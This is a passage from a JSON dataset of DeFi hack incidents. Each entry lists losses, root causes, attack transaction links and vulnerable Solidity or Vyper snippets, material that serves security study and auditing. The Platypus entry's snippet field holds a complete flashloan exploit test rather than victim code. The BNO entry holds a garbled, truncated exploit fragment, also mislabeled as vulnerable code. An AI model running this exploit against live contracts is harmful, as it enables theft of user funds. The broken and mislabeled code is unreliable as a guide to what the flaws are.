swapFeeTotal);\n    swapFeeTotal = 0;\n}\n",
        "attack_tx": "https://explorer.phalcon.xyz/tx/bsc/0xca4d0d24aa448329b7d4eb81be653224a59e7b081fc7a1c9aad59c5a38d0ae19",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1600442137811689473",
            "https://twitter.com/peckshield/status/1600418002163625984"
        ]
    },
    {
        "type": "Dex/AMM, Reentrancy",
        "date": "20221223",
        "lost": "$170k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Defrost_exp.sol",
        "title": "Defrost",
        "root_cause": "Reentrancy. Lack of reentrancy lock for the flashloan()/deposit() functions, which was used by the hacker to manipulate the share price of LSWUSDC",
        "attack_tx": "https://snowtrace.io/tx/0xc6fb8217e45870a93c25e2098f54f6e3b24674a3083c30664867de474bf0212d",
        "analysis": "https://twitter.com/PeckShieldAlert/status/1606276020276891650",
        "vulnerable_code_snippet": "function flashLoan(\n    IERC3156FlashBorrower receiver,\n    address token,\n    uint256 amount,\n    bytes calldata data\n) external virtual returns (bool) {\n    require(token == address(asset),\"flash borrow token Error!\");\n    uint256 fee = flashFee(token, amount);\n    onWithdraw(address(receiver),amount);\n    require(\n        receiver.onFlashLoan(msg.sender, token, amount, fee, data) == _RETURN_VALUE,\n        \"invalid return value\"\n    );\n    onDeposit(address(receiver),amount + fee,0);\n    emit FlashLoan(msg.sender,address(receiver),token,amount);\n    return true;\n}\n\nfunction deposit(uint256 _amount, address receiver) external returns (uint256){\n    uint256 amount = _deposit(msg.sender,_amount,receiver);\n    emit Deposit(msg.sender,receiver,_amount,amount);\n    return amount;\n}\n"
    },
    {
        "type": "Arbitrage",
        "date": "20230712",
        "title": "Platypus",
        "root_cause": "The root is the price difference between two of the pools, so Users could deposit USDC and withdraw more USDT.",
        "attack_tx": "https://snowtrace.io/address/0xc64afc460290ed3df848f378621b96cb7179521a",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/Platypus02_exp.sol",
        "analysis": "https://twitter.com/peckshield/status/1678800450303164431",
        "Lost": "$51K",
        "vulnerable_code_snippet": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./../interface.sol\";\n\n// @KeyInfo - Total Lost : ~51K USD$\n// Attacker : https://snowtrace.io/address/0xc64afc460290ed3df848f378621b96cb7179521a\n// Attack Contract : https://snowtrace.io/address/0x16a3c9e492dee1503f46dea84c52c6a0608f1ed8\n// Vulnerable Contract : https://polygonscan.com/address/0x9c80a455ecaca7025a45f5fa3b85fd6a462a447b\n// Attack Tx : https://snowtrace.io/tx/0x4b544e5ffb0420977dacb589a6fb83e25347e0685275a3327ee202449b3bfac6 mutiple txs\n\n// @Info\n// Vulnerable Contract Code : https://snowtrace.io/address/0x7e1333a39abed9a5664661957b80ba01d2702b1e#code\n\n// @Analysis\n// Twitter Guy : https://twitter.com/peckshield/status/1678800450303164431\n// Root Cause\n// Deposit according to the USDC-LP within the ratio to calculate the deposit USDC amount.\n// Withdrawal when the amount of USDC-LP to take with the USDT.e-LP inside the ratio to do the calculation of withdrawal amount\n// the two pools (USDC-LP, USDT.e-LP) in the ratio is close, but in fact is not the same, arbitrage or attack?\n\ninterface IPlatypusPool {\n    function deposit(address token, uint256 amount, address to, uint256 deadline) external returns (uint256);\n\n    function withdrawFromOtherAsset(\n        address initialToken,\n        address wantedToken,\n        uint256 liquidity,\n        uint256 minimumAmount,\n        address to,\n        uint256 deadline\n    ) external returns (uint256);\n\n    function swap(\n        address fromToken,\n        address toToken,\n        uint256 fromAmount,\n        uint256 minimumToAmount,\n        address to,\n        uint256 deadline\n    ) external returns (uint256, uint256);\n}\n\ncontract ContractTest is Test {\n    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);\n    IERC20 USDTe = IERC20(0xc7198437980c041c805A1EDcbA50c1Ce5db95118);\n    IERC20 LP_USDC = IERC20(0x06f01502327De1c37076Bea4689a7e44279155e9);\n    IPlatypusPool PlatypusPool = IPlatypusPool(0xbe52548488992Cc76fFA1B42f3A58F646864df45);\n    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n\n    function setUp() public {\n        vm.createSelectFork(\"Avalanche\", 32_470_736);\n        vm.label(address(USDTe), \"USDTe\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(LP_USDC), \"LP_USDC\");\n        vm.label(address(aaveV3), \"aaveV3\");\n        vm.label(address(PlatypusPool), \"PlatypusPool\");\n    }\n\n    function testExploit() public {\n        aaveV3.flashLoanSimple(address(this), address(USDC), 85_000 * 1e6, new bytes(0), 0);\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n\n    function executeOperation(\n        address asset,\n        uint256 amount,\n        uint256 premium,\n        address initator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        USDC.approve(address(aaveV3), amount + premium);\n\n        USDC.approve(address(PlatypusPool), USDC.balanceOf(address(this)));\n        PlatypusPool.deposit(address(USDC), USDC.balanceOf(address(this)), address(this), block.timestamp); // deposit USDC\n        LP_USDC.approve(address(PlatypusPool), LP_USDC.balanceOf(address(this)));\n        PlatypusPool.withdrawFromOtherAsset(\n            address(USDC), address(USDTe), LP_USDC.balanceOf(address(this)), 0, address(this), block.timestamp\n        ); // withdraw USDC-LP from USDT.e-LP , calculate the amount of USDT.e to withdraw base on USDT.e-LP ratio, which different from USDC-LP's ratio\n\n        USDTe.approve(address(PlatypusPool), USDTe.balanceOf(address(this)));\n        PlatypusPool.swap(\n            address(USDTe), address(USDC), USDTe.balanceOf(address(this)), 0, address(this), block.timestamp\n        ); // swap USDT.e to USDC\n\n        return true;\n    }\n}\n"
    },
    {
        "type": "Business Logic Flaw",
        "date": "20230718",
        "title": "BNO",
        "root_cause": "Emergency withdrawals were made without withdrawing the staked NFTs, and the rewardDebt ledger is set to 0, resulting in them still being claimable when the stake was canceled. The attacker repeats this process and obtains a large reward.",
        "attack_tx": "https://bscscan.com/tx/0x33fed54de490797b99b2fc7a159e43af57e9e6bdefc2c2d052dc814cfe0096b9",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/BNO_exp.sol",
        "analysis": "https://twitter.com/BeosinAlert/status/1681116206663876610",
        "lost": "$505K",
        "vulnerable_code_snippet":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./../interface.sol\";\n\ninterface IPool {\n    function emergencyWithdraw() external;\n\n    function stakeNft(uint256;\n        tokenIds[0] = 13;\n        tokenIds[1] = 14;\n        Pool.stakeNft{value: 0.008 ether}(tokenIds);\n        Pool.pledge{value: 0.008 ether}(BNO.balanceOf(address(this)));\n        // Emergency withdraw is made without withdrawing the staked NFTs\n        Pool.emergencyWithdraw();\n        // Stake is canceled but NFTs are still claimable\n        Pool.unstakeNft{value: 0.008 ether}(tokenIds);\n    }\n}\n"
    },
    {
        "type": "Reentrancy",
        "date": "20240412",
        "title": "SumerMoney",
        "root_cause": "- The reentrancy in the function `repayBorrowBehalf` allows the attacker to manipulate the exchanged rate of `ETH:sdrETH` by borrowing against all of the assets held in the contract. Then he could redeem all the tokens to gain profits.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/SumerMoney_exp.sol",
        "attack_tx": "https://basescan.org/tx/0x619c44af9fedb8f5feea2dcae1da94b6d7e5e0e7f4f4a99352b6c4f5e43a4661",
        "analysis": [
            "https://medium.com/neptune-mutual/how-was-sumer-money-exploited-2c114ebffaa8",
            "https://twitter.com/0xNickLFranklin/status/1778986926705672698"
        ],
        "Lost": "350K",
        "vulnerable_code_snippet": "function repayBorrowBehalf(address borrower) external payable {\n  uint256 received = msg.value;\n  uint256 borrows = CEther(payable(this)).borrowBalanceCurrent(borrower);\n  if (received > borrows) {\n    // payable(msg.sender).transfer(received - borrows);\n    (bool success, ) = msg.sender.call{value: received - borrows}(\"\");\n    require(success, \"Address: unable to send value, recipient may have reverted\");\n  }\n  (uint256 err, ) = repayBorrowBehalfInternal(borrower, borrows);\n  requireNoError(err, \"repayBorrowBehalf failed\");\n}\n"
    },
    {
        "type": "DAO, Flashloans",
        "date": "20220428",
        "lost": "$13 M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220428-deus-dao---flashloan--price-oracle-manipulation",
        "title": "DEUS DAO",
        "root_cause": "Incorrect price calculation via balanceOf.",
        "analysis": "The vulnerable code snippet attempts to calculate the on-chain LP price. However, it uses `balanceOf` to retrieve token balances, which can be manipulated by attackers exploiting flashloans. This manipulation leads to inaccurate price calculations and potential exploitation.",
        "vulnerable_code_snippet": "/// @notice returns on chain LP price\nfunction getOnChainPrice() public view returns (uint256) {\n    return\n        ((dei.balanceOf(address(pair)) * IBaseV1Pair(address(pair)).getAmountOut(1e18, address(dei)) * 1e12 / 1e18) + (usdc.balanceOf(address(pair)) * 1e12)) * 1e18 / pair.totalSupply(); // vulnerable point\n}\n"
    },
    {
        "type": "Incorrect logic, Yield",
        "date": "20210622",
        "title": "Eleven Finance",
        "root_cause": "Incorrect logic flow",
        "attack_tx": null,
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20210622-eleven-finance---doesnt-burn-shares",
        "analysis": "In emergencyBurn function, we can see incorrect logic, withdraw token but without burning token. So attacker can withdraw again after calling emergencyBurn.",
        "vulnerable_code_snippet": "function emergencyBurn() public {  //vulnerable point\n        uint balan = balanceOf(msg.sender);\n        uint avai = available();\n        if(avai<balan) IMasterMind(mastermind).withdraw(nrvPid, (balan.sub(avai)));\n        token.safeTransfer(msg.sender, balan);\n        emit Withdrawn(msg.sender, balan, block.number);\n    }"
    },
    {
        "type": "ERC721, Insufficient validation",
        "date": "20220626",
        "title": "XCarnival",
        "lost": "$3.87M",
        "root_cause": "call XToken contract's borrow(), there is no judgment that the NFT has been withdrawn.",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs#20220626-xcarnival---infinite-number-of-loans",
        "vulnerable_code_snippet": "function pledgeAndBorrow(address _collection, uint256 _tokenId, uint256 _nftType, address xToken, uint256 borrowAmount) external nonReentrant {\n        uint256 orderId = pledgeInternal(_collection, _tokenId, _nftType);\n        IXToken(xToken).borrow(orderId, payable(msg.sender), borrowAmount); //vulnerable point\n    }",
        "analysis": "Parameter xToken can control, attakcer can withdraw pledged NFT."
    },
    {
        "type": "Access Control, Price Manipulation",
        "date": "20230227",
        "lost": "$1M",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/SwapX_exp.sol",
        "title": "swapX",
        "root_cause": "Contract X mentioned above is the implementation contract of SwapX Proxy (not yet verified and audited), the Proxy will allow users to pass data and call the implementation contract: [https://bscscan.com/address/0x0ccee62efec983f3ec4bad3247153009fb483551]",
        "attack_tx": "https://bscscan.com/tx/0x3ee23c1585474eaa4f976313cafbc09461abb781d263547c8397788c68a00160",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1630111965942018049",
            "https://twitter.com/peckshield/status/1630100506319413250"
        ],
        "vulnerable_code_snippet": "function swap(\n    IERC20 srcToken,\n    IERC20 dstToken,\n    address dstReceiver,\n    uint256 amount,\n    uint256 minReturnAmount,\n    address referrer,\n    bytes calldata data\n) \n    external \n    payable \n    whenNotPaused\n    returns (uint256 returnAmount)\n{\n    require(minReturnAmount > 0, \"Min return should not be 0\");\n    require(data.length > 0, \"Call data should exist\");\n\n    dstReceiver = (dstReceiver == address(0)) ? msg.sender : dstReceiver;\n    uint256 initialSrcBalance = srcToken.universalBalanceOf(msg.sender);\n    uint256 initialDstBalance = dstToken.universalBalanceOf(dstReceiver);\n\n    {\n    (bool success, bytes memory returndata) = swapXImpl.call{value: msg.value}(data); // vulnerable point\n    if (!success)  {\n        // Look for revert reason and bubble it up if present\n        if (returndata.length > 0) {\n            // The easiest way to bubble the revert reason is using memory via assembly\n\n            // solhint-disable-next-line no-inline-assembly\n            assembly {\n                let returndata_size := mload(returndata)\n                revert(add(32, returndata), returndata_size)\n            }\n        } else {\n            revert(\"swap failed\");\n        }\n    }\n    }\n}\n"
    },
    {
        "type": "Flashloans, Price Manipulation",
        "date": "20231011",
        "title": "BH",
        "root_cause": "The attacker used a flashloan to manipulate the BH/USDT trading pair on PancakeSwap, creating significant slippage. They added liquidity, swapped a large amount of USDT for BH tokens, and then burned BH tokens to remove liquidity, altering the ratio to withdraw more USDT than initially provided. The attacker repaid the flash loan, profited substantially, and laundered the funds through Tornado Cash.",
        "attack_tx": "https://bscscan.com/tx/0xc11e4020c0830bcf84bfa197696d7bfad9ff503166337cb92ea3fade04007662",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/BH_exp.sol",
        "vulnerable_code_snippet": "pragma solidity 0.8.4;\n// SPDX-License-Identifier: MIT\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint);\n    function balanceOf(address account) external view returns (uint);\n    function transfer(address recipient, uint amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint);\n    function approve(address spender, uint amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint value);\n    event Approval(address indexed owner, address indexed spender, uint value);\n}\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes memory) {\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\n        return msg.data;\n    }\n}\ncontract Ownable is Context {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the deployer as the initial owner.\n     */\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\nlibrary SafeMath {\n  function add(uint a, uint b) internal pure returns (uint) {\n    uint c = a + b;\n    require(c >= a, \"SafeMath: addition overflow\");\n    return c;\n  }\n  function sub(uint a, uint b) internal pure returns (uint) {\n    return sub(a, b, \"SafeMath: subtraction overflow\");\n  }\n  function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n    require(b <= a, errorMessage);\n    uint c = a - b;\n    return c;\n  }\n  function mul(uint a, uint b) internal pure returns (uint) {\n    if (a == 0) {\n      return 0;\n    }\n    uint c = a * b;\n    require(c / a == b, \"SafeMath: multiplication overflow\");\n    return c;\n  }\n  function div(uint a, uint b) internal pure returns (uint) {\n    return div(a, b, \"SafeMath: division by zero\");\n  }\n  function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n    // Solidity only automatically asserts when dividing by 0\n    require(b > 0, errorMessage);\n    uint c = a / b;\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n    return c;\n  }\n  function mod(uint a, uint b) internal pure returns (uint) {\n    return mod(a, b, \"SafeMath: modulo by zero\");\n  }\n  function mod(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n    require(b != 0, errorMessage);\n    return a % b;\n  }\n}\ninterface IUniswapV2Factory {\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n}\ncontract BH is Context, IERC20, Ownable {\n\n    using SafeMath for uint;\n    address factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;\n    address usdt = 0x55d398326f99059fF775485246999027B3197955;\n    address pair;\n\n    mapping (address => uint) private _balances;\n    mapping (address => mapping (address => uint)) private _allowances;\n    mapping (address => bool) public isWhite;\n\n    uint private constant E18 = 1000000000000000000;\n    uint private constant MAX = ~uint(0);\n    uint private _totalSupply = 99900000000 * E18;\n    \n    uint private _decimals = 18;\n    string private _symbol = \"BH\";\n    string private _name = \"BH Token\";\n\n    constructor(address recipient){\n        _balances[recipient] = _totalSupply;\n        pair = IUniswapV2Factory(factory).createPair(address(this), usdt);\n        isWhite[recipient] = true;\n        emit Transfer(address(0), recipient, _totalSupply);\n    }\n\n    receive() external payable {}\n\n    function decimals() public view  returns(uint) {\n        return _decimals;\n    }\n    function symbol() public view  returns (string memory) {\n        return _symbol;\n    }\n    function name() public view  returns (string memory) {\n        return _name;\n    }\n    function totalSupply() public override view returns (uint) {\n        return _totalSupply;\n    }\n    function balanceOf(address account) public override view returns (uint) {\n        return _balances[account];\n    }\n    function transfer(address recipient, uint amount) public override returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        return true;\n    }\n    function allowance(address owner, address spender) public view override returns (uint) {\n        return _allowances[owner][spender];\n    }\n    function approve(address spender, uint amount) public override returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n    function transferFrom(address sender, address recipient, uint amount) public override returns (bool) {\n        _transfer(sender, recipient, amount);\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n    function increaseAllowance(address spender, uint addedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));\n        return true;\n    }\n    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\n        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\n        return true;\n    }\n\n    function _transfer(address sender, address to, uint amount) internal {\n\n        require(isWhite[sender] || isWhite[to], \"ERC20: not white\");\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(amount > 0, \"Transfer amount must be greater than zero\");\n        require(_balances[sender] >= amount,\"exceed balance!\");\n        \n        _balances[sender] = _balances[sender].sub(amount);\n        _balances[to] = _balances[to].add(amount);\n        emit Transfer(sender, to, amount);\n        \n    }\n    \n    function _approve(address owner, address spender, uint amount) internal {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function setwhite(address user,bool iswhite) external onlyOwner{\n        isWhite[user] = iswhite;\n    }\n\n}\n",
        "analysis": [
            "https://twitter.com/BeosinAlert/status/1712139760813375973",
            "https://twitter.com/DecurityHQ/status/1712118881425203350"
        ],
        "lost": "$1.27M"
    },
    {
        "type": "Reentrancy",
        "date": "20230203",
        "title": "Orion Protocol",
        "lost": "$3M",
        "root_cause": "Reentrancy in the doSwapThroughOrionPool function",
        "attack_tx": [
            "https://etherscan.io/tx/0xa6f63fcb6bec8818864d96a5b1bb19e8bd85ee37b2cc916412e720988440b2aa",
            "https://bscscan.com/tx/0xfb153c572e304093023b4f9694ef39135b6ed5b2515453173e81ec02df2e2104"
        ],
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Orion_exp.sol",
        "vulnerable_code": "https://etherscan.io/address/0x420a50a62b17c18b36c64478784536ba980feac8#code#F1#L78",
        "analysis": [
            "https://twitter.com/BlockSecTeam/status/1621263393054420992",
            "https://www.numencyber.com/analysis-of-orionprotocol-reentrancy-attack-with-poc/"
        ],
        "similar_events": [
            "https://github.com/SunWeb3Sec/DeFiHackLabs#20221223---defrost---reentrancy",
            "https://github.com/SunWeb3Sec/DeFiHackLabs#20221110---dfxfinance---reentrancy"
        ],
        "vulnerable_code_snippet": "function doSwapThroughOrionPool(\n    address user,\n    address to,\n    IPoolFunctionality.SwapData calldata swapData\n) external override returns (uint256 amountOut, uint256 amountIn) {\n    bool withFactory = swapData.path.length > 2 &&\n        (supportedFactories[swapData.path[0]] != FactoryType.UNSUPPORTED);\n    address curFactory = withFactory ? swapData.path[0] : factory;\n    address[] memory new_path;\n\n    uint256 tokenIndex = withFactory ? 1 : 0;\n    new_path = new address[](swapData.path.length - tokenIndex);\n\n    for ((uint256 i, uint256 j) = (tokenIndex, 0); i < swapData.path.length; (++i, ++j)) {\n        new_path[j] = swapData.path[i] == address(0) ? WETH : swapData.path[i];\n    }\n\n    (uint256 amount_spend_base_units, uint256 amount_receive_base_units) = (\n        LibUnitConverter.decimalToBaseUnit(\n            swapData.path[tokenIndex],\n            swapData.amount_spend\n        ),\n        LibUnitConverter.decimalToBaseUnit(\n            swapData.path[swapData.path.length - 1],\n            swapData.amount_receive\n        )\n    );\n    {\n    (uint256 userAmountIn, uint256 userAmountOut) = _doSwapTokens(InternalSwapData( //vulnerable point\n        user,\n        amount_spend_base_units,\n        amount_receive_base_units,\n        withFactory ? swapData.path[1] : swapData.path[0],\n        new_path,\n        swapData.is_exact_spend,\n        to,\n        curFactory,\n        supportedFactories[curFactory],\n        swapData.supportingFee\n    ));\n\n    //  Anyway user gave amounts[0] and received amounts[len-1]\n    amountOut = LibUnitConverter.baseUnitToDecimal(\n        swapData.path[tokenIndex],\n        userAmountIn\n    );\n    amountIn = LibUnitConverter.baseUnitToDecimal(\n        swapData.path[swapData.path.length - 1],\n        userAmountOut\n    );\n    }\n}\n"
    },
    {
        "type": "Price Manipulation",
        "date": "20230814",
        "title": "ZunamiProtocol",
        "root_cause": "Zunami Protocol's contract calculates account balances using the cacheAssetPrice() value, which depends on totalHoldings. The attacker manipulated totalHoldings by flash loaning in funds from multiple sources, then swapping these funds for 4.8M UZD on Curve.",
        "attack_tx": "https://etherscan.io/tx/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/Zunami_exp.sol",
        "analysis": [
            "https://twitter.com/peckshield/status/1690877589005778945",
            "https://twitter.com/BlockSecTeam/status/1690931111776358400"
        ],
        "Lost": "$2M",
        "vulnerable_code_snippet": "function cacheAssetPrice() public virtual {\n    _blockCached = block.number;\n    uint256 currentAssetPrice = assetPrice();\n    if (_assetPriceCached < currentAssetPrice) {\n        _assetPriceCached = currentAssetPrice;\n        emit CachedAssetPrice(_blockCached, _assetPriceCached);\n    }\n}\n"
    },
    {
        "type": "Price Manipulation, Sandwich",
        "date": "20230802",
        "title": "CurveBurner",
        "root_cause": "This attack was made possible by maliciously calling the `execute()`function of the `UnderlyingBurner` contract(which is slippage tolerant), the attacker uses the execute function to further imbalance the 3pool allowing the attacker to buy tokens (like DAI and USDC) low, and sell them at a high prices",
        "attack_tx": "https://etherscan.io/tx/0xd493c73397952049644c531309df3dd4134bf3db1e64eb6f0b68b016ee0bffde",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-08/CurveBurner_exp.sol",
        "analysis": "https://medium.com/@Hypernative/exotic-culinary-hypernative-systems-caught-a-unique-sandwich-attack-against-curve-finance-6d58c32e436b",
        "vulnerable_code_snippet": "@external\n def execute() -> bool:\n    \"\"\"\n    @notice Add liquidity to 3pool and transfer 3CRV to the fee distributor\n    @return bool success\n    \"\"\"\n    assert not self.is_killed  # dev: is killed\n\n    amounts: uint256[3] = [\n        ERC20(TRIPOOL_COINS[0]).balanceOf(self),\n        ERC20(TRIPOOL_COINS[1]).balanceOf(self),\n        ERC20(TRIPOOL_COINS[2]).balanceOf(self),\n    ]\n    if amounts[0] != 0 and amounts[1] != 0 and amounts[2] != 0:\n        StableSwap(TRIPOOL).add_liquidity(amounts, 0)\n\n    amount: uint256 = ERC20(TRIPOOL_LP).balanceOf(self)\n    if amount != 0:\n        ERC20(TRIPOOL_LP).transfer(self.receiver, amount)\n\n    return True\n\n@payable\n@external\n def burn(_coin: address) -> bool:\n    \"\"\"\n    @notice Receive `_coin` and swap for USDC if not a 3pool asset\n    @param _coin Address of the coin being received\n    @return bool success\n    \"\"\"\n    assert not self.is_killed  # dev: is killed\n\n    # transfer coins from caller\n    amount: uint256 = ERC20(_coin).balanceOf(msg.sender)\n    if amount != 0:\n        response: Bytes[32] = raw_call(\n            _coin,\n            concat(\n                method_id(\"transferFrom(address,address,uint256)\"),\n                convert(msg.sender, bytes32),\n                convert(self, bytes32),\n                convert(amount, bytes32),\n            ),\n            max_outsize=32,\n        )\n        if len(response) != 0:\n            assert convert(response, bool)\n\n    # if coin is not in 3pool, swap it for USDC\n    if not _coin in TRIPOOL_COINS:\n        registry_swap: address = AddressProvider(ADDRESS_PROVIDER).get_address(2)\n\n        if not self.is_approved[registry_swap][_coin]:\n            response: Bytes[32] = raw_call(\n                _coin,\n                concat(\n                    method_id(\"approve(address,uint256)\"),\n                    convert(registry_swap, bytes32),\n                    convert(MAX_UINT256, bytes32),\n                ),\n                max_outsize=32,\n            )\n            if len(response) != 0:\n                assert convert(response, bool)\n            self.is_approved[registry_swap][_coin] = True\n\n        if _coin == SUSD:\n            # if the coin is sUSD, settle prior to exchanging\n            Synthetix(SNX).settle(SUSD_CURRENCY_KEY)\n\n        # get actual balance in case of transfer fee or pre-existing balance\n        amount = ERC20(_coin).balanceOf(self)\n        if amount != 0:\n            RegistrySwap(registry_swap).exchange_with_best_rate(_coin, USDC, amount, 0)\n\n    return True\n"
    },
    {
        "type": "Business Logic Flaw, Flashloans",
        "date": "20231005",
        "title": "DePayRouter",
        "root_cause": "A flash loan attack on the DePay platform resulted in the theft of 827 USDC. The exploiter took advantage of a security issue in the DePay router to execute the theft.",
        "attack_tx": "[0x9a036058afb58169bf | Phalcon Explorer](https://app.blocksec.com/explorer/tx/eth/0x9a036058afb58169bfa91a826f5fcf4c0a376e650960669361d61bef99205f35?line=41)",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/DePayRouter_exp.sol",
        "analysis": "[CertiK Alert on Twitter / X](https://x.com/CertiKAlert/status/1709764146324009268)",
        "vulnerable_code_snippet": "// The main function to route transactions.\nfunction route(\n    // The path of the token conversion.\n    address[] calldata path,\n    // Amounts passed to processors:\n    // e.g. [amountIn, amountOut, deadline]\n    uint[] calldata amounts,\n    // Addresses passed to plugins:\n    // e.g. [receiver]\n    address[] calldata addresses,\n    // List and order of plugins to be executed for this payment:\n    // e.g. [Uniswap,paymentPlugin] to swap and pay\n    address[] calldata plugins,\n    // Data passed to plugins:\n    // e.g. [\"signatureOfSmartContractFunction(address,uint)\"] receiving the payment\n    string[] calldata data\n) external payable returns (bool) {\n    uint balanceBefore = _balanceBefore(path[path.length - 1]);\n    _ensureTransferIn(path[0], amounts[0]);\n    _execute(path, amounts, addresses, plugins, data);\n    _ensureBalance(path[path.length - 1], balanceBefore);\n    return true;\n}\n"
    },
    {
        "type": "Business Logic Flaw, Flashloans",
        "date": "20221121",
        "lost": "$13k",
        "POC": "https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/SDAO_exp.sol",
        "title": "SDAO",
        "root_cause": [
            "sDAO contract have the following pitfalls:",
            "1. missing target token validation or access control on `withdrawTeam`, as the result, attacker may manipulate the reward output",
            "2. logic flaw on reward generation, the user can get reward in the same block when `to == address(LPInstance)`"
        ],
        "attack_tx": "https://bscscan.com/tx/0xb3ac111d294ea9dedfd99349304a9606df0b572d05da8cedf47ba169d10791ed",
        "analysis": [
            "1. The attacker borrowed $500 `USDT` from `DPPOracle` in a flash loan.",
            "2. They converted half of the `USDT` into `sDAO\u3002",
            "3. They added liquidity to the `sDAO/USDT` pool with half of the remaining `USDT` and the `sDAO` they had just converted.",
            "4. They staked half of the LP tokens they received in the previous step.",
            "5. They sent the remaining `sDAO` to the liquidity pool, which increased the `totalStakeReward\u3002",
            "6. They called `sDAO.withdrawTeam` with LP tokens address as the target, which decreased the `LPInstance.balanceOf(address(this))` and increased the `getPerTokenReward`. They also sent a small amount of LP token to the pool to avoid division by zero.",
            "7. They invoked `getReward` and repaid the flash loan.",
            "[https://twitter.com/8olidity/status/1594693686398316544](https://twitter.com/8olidity/status/1594693686398316544)",
            "[https://twitter.com/CertiKAlert/status/1594615286556393478](https://twitter.com/CertiKAlert/status/1594615286556393478)"
        ],
        "vulnerable_code_snippet": "function getPerTokenReward() public view returns(uint) {\n    if ( LPInstance.balanceOf(address(this)) == 0) {\n        return 0;\n    }\n\n    uint newPerTokenReward = (totalStakeReward - lastTotalStakeReward) * 1e18 / LPInstance.balanceOf(address(this));\n    return PerTokenRewardLast + newPerTokenReward;\n}\n\nfunction transferFrom(\n    address from,\n    address to,\n    uint amount\n) public virtual override returns (bool) {\n    address spender = _msgSender();\n    if ( to == address(LPInstance) && tx.origin != address(0x547d834975279964b65F3eC685963fCc4978631E) ) {\n        totalStakeReward += amount * 7 / 100;\n        _standardTransfer(from, address(this), amount * 7 / 100 );\n        _standardTransfer(from, address(0x0294a4C3E85d57Eb3bE568aaC17C4243d9e78beA), amount / 100 );\n        _burn(from, amount / 50);\n        amount = amount * 90 / 100;\n    }\n\n    _spendAllowance(from, spender, amount);\n    _transfer(from, to, amount);\n    return true;\n}\n\nfunction withdrawTeam(address _token) external {\n    IERC20(_token).transfer(TEAM, IERC20(_token).balanceOf(address(this)));\n    